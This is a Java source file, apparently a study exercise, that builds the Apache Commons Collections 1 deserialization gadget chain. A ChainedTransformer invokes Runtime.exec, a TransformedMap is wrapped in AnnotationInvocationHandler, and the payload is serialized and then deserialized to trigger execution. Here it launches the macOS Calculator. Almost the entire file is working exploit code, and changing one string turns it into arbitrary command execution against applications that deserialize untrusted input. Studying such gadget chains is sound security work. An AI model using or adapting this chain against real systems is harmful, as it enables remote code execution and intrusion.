package Test_CC;

import expUtils.ExpUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.IOException;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

//        Class clz = Runtime.class;
//        Method method = clz.getMethod("getRuntime",null);
//        Runtime obj = (Runtime) method.invoke(null,null);
//        obj.exec(cmd);
//        System.out.println(obj);



public class Test {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, ClassNotFoundException, InstantiationException {

//        第一步
        String cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        第二步
        HashMap<String,String> hashMap = new HashMap<>();
        hashMap.put("value","testVal");  // 这个地方留坑
        Map evilMap = TransformedMap.decorate(hashMap,null,chainedTransformer);
//        Map.Entry entry = (Map.Entry) evilMap.entrySet().iterator().next();
//        entry.setValue("1");    测试触发

//       第三步
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor =  clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler evilHandler = (InvocationHandler) constructor.newInstance(Target.class, evilMap);

//        第四步
        String path = ExpUtils.serialize(evilHandler);
        ExpUtils.unserialize(path);
    }
}
